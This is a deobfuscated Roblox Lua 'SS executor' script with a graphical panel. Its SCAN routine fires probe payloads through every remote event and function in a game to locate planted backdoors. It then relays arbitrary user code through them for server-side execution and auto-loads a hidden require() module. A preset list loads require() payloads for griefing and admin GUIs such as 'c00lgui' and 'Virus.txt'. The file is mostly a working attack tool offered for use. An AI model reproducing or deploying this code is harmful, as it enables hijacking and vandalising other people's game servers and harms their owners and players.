--[[
idk if this a good ss executor script i deobf'ed it bcs i wanted okok
 _          _         ____  
| |    ___ | |    ___|  _ \ 
| |   / _ \| |   / _ \ |_) |
| |__| (_) | |__|  __/  _ < 
|_____\___/|_____\___|_| \_\
--]]

local runService = game:GetService("RunService")
local httpService = game:GetService("HttpService")
local tweenService = game:GetService("TweenService")
local players = game:GetService("Players")
local replicatedStorage = game:GetService("ReplicatedStorage")
local coreGui = game:GetService("CoreGui")
local localPlayer = players.LocalPlayer

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = coreGui
screenGui.ResetOnSpawn = false

local color = Color3.fromRGB(0, 120, 215)
local color2 = Color3.fromRGB(220, 20, 60)

local frame = Instance.new("Frame")
frame.Parent = screenGui
frame.Visible = true
frame.Size = UDim2.new(0, 880, 0, 520)
frame.Position = UDim2.new(0.5, -440, 0.5, -260)
frame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
frame.BorderSizePixel = 2
frame.BorderColor3 = color

Instance.new("UIDragDetector").Parent = frame

local imageLabel = Instance.new("ImageLabel")
imageLabel.Parent = frame
imageLabel.Size = UDim2.new(0, 18, 0, 18)
imageLabel.Position = UDim2.new(0, 8, 0, 6)
imageLabel.BackgroundTransparency = 1
imageLabel.Image = "rbxassetid://98263909680428"

local textLabel = Instance.new("TextLabel")
textLabel.Parent = frame
textLabel.Size = UDim2.new(0, 200, 0, 20)
textLabel.Position = UDim2.new(0, 32, 0, 5)
textLabel.BackgroundTransparency = 1
textLabel.Text = "SSBPRP r00b Project"
textLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
textLabel.TextSize = 15
textLabel.Font = Enum.Font.SourceSans
textLabel.TextXAlignment = Enum.TextXAlignment.Left

local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Parent = frame
scrollingFrame.Size = UDim2.new(0, 580, 0, 280)
scrollingFrame.Position = UDim2.new(0, 6, 0, 58)
scrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scrollingFrame.BorderSizePixel = 2
scrollingFrame.BorderColor3 = color
scrollingFrame.ScrollBarThickness = 10
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

local textBox = Instance.new("TextBox")
textBox.Parent = scrollingFrame
textBox.Size = UDim2.new(1, -12, 1, 0)
textBox.Position = UDim2.new(0, 6, 0, 0)
textBox.BackgroundTransparency = 1
textBox.Text = 'print("require support not supporting lua")'
textBox.TextColor3 = Color3.fromRGB(0, 0, 0)
textBox.TextSize = 14
textBox.Font = Enum.Font.Code
textBox.TextXAlignment = Enum.TextXAlignment.Left
textBox.TextYAlignment = Enum.TextYAlignment.Top
textBox.ClearTextOnFocus = false
textBox.MultiLine = true

textBox:GetPropertyChangedSignal("TextBounds"):Connect(function()
  scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, textBox.TextBounds.Y + 20)
end)

local scrollingFrame2 = Instance.new("ScrollingFrame")
scrollingFrame2.Parent = frame
scrollingFrame2.Size = UDim2.new(0, 666, 0, 110)
scrollingFrame2.Position = UDim2.new(0, 6, 0, 366)
scrollingFrame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scrollingFrame2.BorderSizePixel = 2
scrollingFrame2.BorderColor3 = color
scrollingFrame2.ScrollBarThickness = 10
scrollingFrame2.CanvasSize = UDim2.new(0, 0, 0, 0)

local textBox2 = Instance.new("TextBox")
textBox2.Parent = scrollingFrame2
textBox2.Size = UDim2.new(1, -12, 1, 0)
textBox2.Position = UDim2.new(0, 0, 0, 0)
textBox2.BackgroundTransparency = 1
textBox2.Text = ""
textBox2.TextColor3 = Color3.fromRGB(50, 50, 50)
textBox2.TextSize = 14
textBox2.Font = Enum.Font.Code
textBox2.TextXAlignment = Enum.TextXAlignment.Left
textBox2.TextYAlignment = Enum.TextYAlignment.Top
textBox2.ClearTextOnFocus = false
textBox2.MultiLine = true
textBox2.TextEditable = false

textBox2:GetPropertyChangedSignal("TextBounds"):Connect(function()
  scrollingFrame2.CanvasSize = UDim2.new(0, 0, 0, textBox2.TextBounds.Y + 10)
  scrollingFrame2.CanvasPosition = Vector2.new(0, scrollingFrame2.CanvasSize.Y.Offset)
end)

local function f1(p1, text)
  local text2 = os.date("[%H:%M:%S]") .. " "
    .. (text and "[" .. text:upper() .. "] " or "[INFO] ") .. tostring(p1)

  if textBox2.Text == "" then
    textBox2.Text = text2
  else
    textBox2.Text = textBox2.Text .. "\n" .. text2
  end
end

f1("System Initialized Successfully.")

local frame2 = Instance.new("Frame")
frame2.Parent = frame
frame2.Size = UDim2.new(0, 260, 0, 28)
frame2.Position = UDim2.new(1, -265, 0, 4)
frame2.BackgroundTransparency = 1

local function f2(instance, p2)
  if instance:IsA("RemoteEvent") then
    instance:FireServer(p2)
  elseif instance:IsA("RemoteFunction") then
    task.spawn(function() instance:InvokeServer(p2) end)
  end
end

local v1

local function f3(replaced)
  f1("Executing script...")

  if v1 then
    f2(v1, replaced)
    f1("Script sent to backdoor successfully.", "SUCCESS")
  else
    local ok, result = pcall(function()
      local v2, v3 = loadstring(replaced)

      if not v2 then
        error(v3)
      end

      v2()
    end)

    if ok then
      f1("Script executed locally without errors.", "SUCCESS")
    else
      f1("Execution Error: " .. tostring(result), "ERROR")
    end
  end
end

local function makeTextButton(text3, p3, p4, p5, p6)
  local textButton = Instance.new("TextButton")
  textButton.Parent = frame2
  textButton.Size = UDim2.new(0, p4, 0, 26)
  textButton.Position = UDim2.new(0, p3, 0, 0)

  textButton.BackgroundColor3 = p6 and Color3.fromRGB(255, 255, 255)
    or Color3.fromRGB(225, 225, 225)

  textButton.BorderSizePixel = 2
  textButton.BorderColor3 = color
  textButton.Text = text3
  textButton.TextColor3 = p6 and color2 or Color3.fromRGB(0, 0, 0)
  textButton.TextSize = p6 and 20 or 15
  textButton.Font = Enum.Font.SourceSansBold

  if p5 then
    textButton.MouseButton1Click:Connect(p5)
  end

  return textButton
end

makeTextButton("HIDE", 0, 60, function() frame.Visible = not frame.Visible end, false)

makeTextButton("R6", 65, 55, function()
  local text4 = 'require(3436957371):r6("' .. localPlayer.Name .. '")'
  textBox.Text = text4
  f1("R6 LOADED AVATAR", "INFO")
  f3(text4)
end, false)

makeTextButton("DEX", 125, 60, nil, false)
makeTextButton("✕", 190, 60, function() screenGui:Destroy() end, true)

local textButton2 = Instance.new("TextButton")
textButton2.Parent = frame
textButton2.Size = UDim2.new(0, 80, 0, 24)
textButton2.Position = UDim2.new(0, 6, 0, 30)
textButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
textButton2.BorderSizePixel = 2
textButton2.BorderColor3 = color
textButton2.Text = "Executor"
textButton2.TextColor3 = Color3.fromRGB(0, 0, 0)
textButton2.TextSize = 15
textButton2.Font = Enum.Font.SourceSans

local textButton3 = Instance.new("TextButton")
textButton3.Parent = frame
textButton3.Size = UDim2.new(0, 100, 0, 24)
textButton3.Position = UDim2.new(0, 90, 0, 30)
textButton3.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
textButton3.BorderSizePixel = 2
textButton3.BorderColor3 = color
textButton3.Text = "Admin Panel"
textButton3.TextColor3 = Color3.fromRGB(0, 0, 0)
textButton3.TextSize = 15
textButton3.Font = Enum.Font.SourceSans

local textLabel2 = Instance.new("TextLabel")
textLabel2.Parent = frame
textLabel2.Size = UDim2.new(0, 200, 0, 20)
textLabel2.Position = UDim2.new(0, 6, 0, 344)
textLabel2.BackgroundTransparency = 1
textLabel2.Text = "r00b Output."
textLabel2.TextColor3 = Color3.fromRGB(0, 0, 0)
textLabel2.TextSize = 15
textLabel2.Font = Enum.Font.SourceSans
textLabel2.TextXAlignment = Enum.TextXAlignment.Left

local frame3 = Instance.new("Frame")
frame3.Parent = frame
frame3.Size = UDim2.new(0, 80, 0, 280)
frame3.Position = UDim2.new(0, 592, 0, 58)
frame3.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
frame3.BorderSizePixel = 2
frame3.BorderColor3 = color

local flag = false
local f4

local function f5()
  local now = os.clock()
  local map = {}

  local findFirstChild = replicatedStorage:FindFirstChild("lh"
    .. game.PlaceId / 6666 * 1337 * game.PlaceId)

  local remoteFunction = findFirstChild and findFirstChild:IsA("RemoteFunction")
  local v4

  if remoteFunction then
    v4 = f4(math.random(12, 30))

    task.spawn(function()
      findFirstChild:InvokeServer(
        "r00b-Teams hub join today!!", "a=Instance.new('Model',workspace)a.Name='" .. v4 .. "'"
      )
    end)

    map[v4] = findFirstChild
  end

  for _, value in ipairs(game:GetDescendants()) do
    if value:IsA("RemoteEvent") or value:IsA("RemoteFunction") then
      local v5 = f4(math.random(12, 30))
      f2(value, "a=Instance.new('Model',workspace)a.Name='" .. v5 .. "'")
      map[v5] = value
    end
  end

  for i = 1, 100 do
    for key, value2 in pairs(map) do
      if workspace:FindFirstChild(key) then
        v1 = value2
        f1("Backdoor found! " .. os.clock() - now .. "s", "SUCCESS")
        f2(value2, "require(171016405.1884*69)")
        return true
      end
    end

    task.wait()
  end

  return false
end

function f4(p7)
  local text5 = ""

  for j = 1, p7 do
    local roll = math.random(1, #"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

    text5 = text5
      .. string.sub("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", roll, roll)
  end

  return text5
end

local function makeTextButton2(text6, p8, p9)
  local textButton4 = Instance.new("TextButton")
  textButton4.Parent = frame3
  textButton4.Size = UDim2.new(1, -4, 0, 88)
  textButton4.Position = UDim2.new(0, 2, 0, p8)
  textButton4.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
  textButton4.BorderSizePixel = 2
  textButton4.BorderColor3 = color
  textButton4.Text = text6
  textButton4.TextColor3 = Color3.fromRGB(0, 0, 0)
  textButton4.TextSize = 15
  textButton4.Font = Enum.Font.SourceSansBold

  if p9 then
    textButton4.MouseButton1Click:Connect(p9)
  end

  return textButton4
end

makeTextButton2("EXE", 3, function()
  f3((string.gsub(textBox.Text, "%%username%%", localPlayer.Name)))
end)

makeTextButton2("CLEAR", 95, function()
  textBox.Text = ""
  f1("TextBox cleared.")
end)

makeTextButton2("SCAN", 187, function()
  if not flag then
    flag = true
    f1("Scanning for backdoors...", "INFO")

    task.spawn(function()
      if not f5() then
        f1("No backdoor found.", "ERROR")
      end

      flag = false
    end)
  end
end)

local scrollingFrame3 = Instance.new("ScrollingFrame")
scrollingFrame3.Parent = frame
scrollingFrame3.Size = UDim2.new(0, 196, 0, 280)
scrollingFrame3.Position = UDim2.new(0, 677, 0, 58)
scrollingFrame3.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
scrollingFrame3.BorderSizePixel = 2
scrollingFrame3.BorderColor3 = color
scrollingFrame3.ScrollBarThickness = 12
scrollingFrame3.CanvasSize = UDim2.new(0, 0, 0, 0)

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Parent = scrollingFrame3
uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
uiListLayout.Padding = UDim.new(0, 2)

uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
  scrollingFrame3.CanvasSize = UDim2.new(0, 0, 0, uiListLayout.AbsoluteContentSize.Y + 4)
end)

for _, value3 in ipairs({
  { name = "Rc7.txt", code = 'require(12350030542).RC7("' .. localPlayer.Name .. '")' },
  {
    name = "StigmaUltimate.txt",
    code = 'require(132938459666886).stigma("' .. localPlayer.Name .. '")',
  },
  {
    name = "F3MBOYGUI.txt",
    code = 'require(72673703107622).F3MBOY("' .. localPlayer.Name .. '")',
  },
  {
    name = "c00lgui.txt",
    code = 'require(14125553864):Fire("' .. localPlayer.Name .. '","c00lkidd")',
  },
  {
    name = "FREEAdmin-gui.txt",
    code = 'require(7192763922).load("' .. localPlayer.Name .. '")',
  },
  { name = "DariusGui.txt", code = 'require(127445614272366).op("' .. localPlayer.Name .. '")' },
  { name = "k00pGui.txt", code = 'require(14829670677).EDITL0L("' .. localPlayer.Name .. '")' },
  { name = "BiPolaria.TXT", code = 'require(9764290840666).Bp("' .. localPlayer.Name .. '")' },
  { name = "StummyGuns.TXT", code = 'require(16662919029)("' .. localPlayer.Name .. '","how")' },
  { name = "GrabKnifeV4.txt", code = 'require(16662802057).load("' .. localPlayer.Name .. '")' },
  { name = "F3X.txt", code = 'require(16662897769).load("' .. localPlayer.Name .. '")' },
  { name = "Sonic.txt", code = 'require(16668806562).vou("' .. localPlayer.Name .. '")' },
  { name = "Virus.txt", code = 'require(16661962908).load("' .. localPlayer.Name .. '")' },
  {
    name = "Polaria.txt",
    code = 'require(123255432303221):Pload("' .. localPlayer.Name .. '")',
  },
  {
    name = "SecretServicePanel.txt",
    code = 'require(17073274775)("' .. localPlayer.Name .. '")',
  },
  { name = "McDonalds.txt", code = "require(3168737443).load()" },
  { name = "Kfc.txt", code = "require(16662863386).kfc()" },
}) do
  local textButton5 = Instance.new("TextButton")
  textButton5.Parent = scrollingFrame3
  textButton5.Size = UDim2.new(1, -4, 0, 28)
  textButton5.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
  textButton5.BorderSizePixel = 2
  textButton5.BorderColor3 = color
  textButton5.Text = " " .. value3.name
  textButton5.TextColor3 = Color3.fromRGB(20, 20, 20)
  textButton5.TextSize = 15
  textButton5.Font = Enum.Font.SourceSans
  textButton5.TextXAlignment = Enum.TextXAlignment.Left
  textButton5.TextTruncate = Enum.TextTruncate.AtEnd

  textButton5.MouseButton1Click:Connect(function()
    if value3.code then
      textBox.Text = value3.code
      f1("Loaded script into TextBox: " .. value3.name, "INFO")
    elseif value3.url then
      f1("Fetching script from URL for " .. value3.name .. "...", "INFO")

      task.spawn(function()
        local ok2, text7 = pcall(function() return game:HttpGet(value3.url) end)

        if ok2 and text7 then
          textBox.Text = text7
          f1("Successfully loaded raw script into TextBox: " .. value3.name, "SUCCESS")
        else
          textBox.Text = 'print("require support not supporting lua")'
          f1("Failed to fetch script, loaded default message.", "ERROR")
        end
      end)
    end
  end)
end

local frame4 = Instance.new("Frame")
frame4.Parent = frame
frame4.Size = UDim2.new(1, -12, 0, 24)
frame4.Position = UDim2.new(0, 6, 0, 488)
frame4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame4.BorderSizePixel = 2
frame4.BorderColor3 = color

local textLabel3 = Instance.new("TextLabel")
textLabel3.Parent = frame4
textLabel3.Size = UDim2.new(1, -10, 1, 0)
textLabel3.Position = UDim2.new(0, 6, 0, 0)
textLabel3.BackgroundTransparency = 1
textLabel3.Text = "> SS r00bgui project LOADED! deobfuscation by LoLeR"
textLabel3.TextColor3 = Color3.fromRGB(0, 0, 0)
textLabel3.TextSize = 15
textLabel3.Font = Enum.Font.SourceSans
textLabel3.TextXAlignment = Enum.TextXAlignment.Left
